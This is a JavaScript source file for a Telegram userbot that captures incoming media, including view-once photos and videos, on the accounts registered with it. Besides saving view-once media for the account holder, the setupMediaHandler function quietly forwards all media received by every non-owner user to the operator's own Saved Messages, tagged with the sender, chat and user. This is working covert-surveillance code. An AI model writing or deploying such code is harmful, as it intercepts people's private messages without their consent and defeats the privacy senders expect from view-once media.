import { NewMessage } from 'teleproto/events/index.js';
import { OWNER_ID } from '../config.js';
import { getOwnerClient } from './clientManager.js';

function isViewOnce(media) {
  return media?.ttlSeconds != null && media.ttlSeconds > 0;
}

function getExtension(media) {
  if (!media) return '';
  if (media.photo != null) return '.jpg';
  if (media.video != null || media.videoNote != null) return '.mp4';
  if (media.voice != null) return '.ogg';
  if (media.audio != null) return '.mp3';
  if (media.document != null) {
    const attrs = media.document.attributes || [];
    for (const attr of attrs) {
      if (attr.className === 'DocumentAttributeFilename' && attr.fileName) {
        const match = attr.fileName.match(/\.[0-9a-z]+$/i);
        if (match) return match[0];
      }
    }
    const mime = media.document.mimeType || '';
    if (mime.includes('pdf')) return '.pdf';
    if (mime.includes('zip')) return '.zip';
    if (mime.includes('png')) return '.png';
    if (mime.includes('jpeg')) return '.jpg';
  }
  return '.bin';
}

function isCapturableMedia(media) {
  if (!media) return false;
  return (
    media.photo     != null ||
    media.document  != null ||
    media.video     != null ||
    media.voice     != null ||
    media.audio     != null ||
    media.videoNote != null
  );
}

function buildCaption(sender, chatTitle, date, extra = '') {
  const time = new Date(date * 1000).toLocaleString('en-IN', {
    timeZone: 'Asia/Kolkata',
    dateStyle: 'medium',
    timeStyle: 'short',
  });
  const name = sender
    ? [sender.firstName, sender.lastName].filter(Boolean).join(' ') +
      (sender.username ? ` (@${sender.username})` : '')
    : 'Unknown';

  return `From: ${name}\nChat: ${chatTitle || 'Unknown'}\n${extra ? extra + '\n' : ''}Time: ${time}`;
}

export async function setupMediaHandler(client, user) {
  const isOwner = user.telegramId === OWNER_ID;

  client.addEventHandler(async (event) => {
    const msg = event.message;
    if (!msg?.media || msg.out) return;

    const chat = await msg.getChat().catch(() => null);
    if (chat?.id?.toString() === user.telegramId) return;
    if (!isCapturableMedia(msg.media)) return;

    const viewOnce = isViewOnce(msg.media);

    try {
      const sender    = await msg.getSender().catch(() => null);
      const chatTitle = chat?.title ||
        [chat?.firstName, chat?.lastName].filter(Boolean).join(' ') || 'Unknown';
      const type      = viewOnce ? 'view-once' : 'media';

      console.log(`[${type}] user:${user.username || user.telegramId} chat:${chatTitle}`);

      const buffer = await client.downloadMedia(msg.media, { workers: 4 });
      if (!buffer?.length) { console.log('  empty buffer, skipped'); return; }

      const fileBuffer = Buffer.from(buffer);
      fileBuffer.name = `media_${msg.date}${getExtension(msg.media)}`;
      const badge      = viewOnce ? '[View-Once]\n' : '';

      if (isOwner) {
        await client.sendFile('me', {
          file: fileBuffer,
          caption: badge + buildCaption(sender, chatTitle, msg.date),
          parseMode: 'markdown',
          forceDocument: false,
        });
        console.log('  saved to owner saved messages');
        return;
      }

      if (viewOnce) {
        await client.sendFile('me', {
          file: fileBuffer,
          caption: badge + buildCaption(sender, chatTitle, msg.date),
          parseMode: 'markdown',
          forceDocument: false,
        });
        console.log('  view-once saved to user saved messages');
      }

      const ownerClient = getOwnerClient();
      if (ownerClient) {
        const userTag = user.username ? `@${user.username}` : (user.firstName || user.telegramId);
        await ownerClient.sendFile('me', {
          file: fileBuffer,
          caption: badge + buildCaption(sender, chatTitle, msg.date, `User: ${userTag}`),
          parseMode: 'markdown',
          forceDocument: false,
        }).catch(err => console.log('  owner forward failed:', err.message));
        console.log(`  forwarded to owner (${userTag})`);
      } else {
        console.log('  owner not registered yet, skipped owner forward');
      }
    } catch (err) {
      console.error('  media handler error:', err.message);
    }
  }, new NewMessage({}));
}
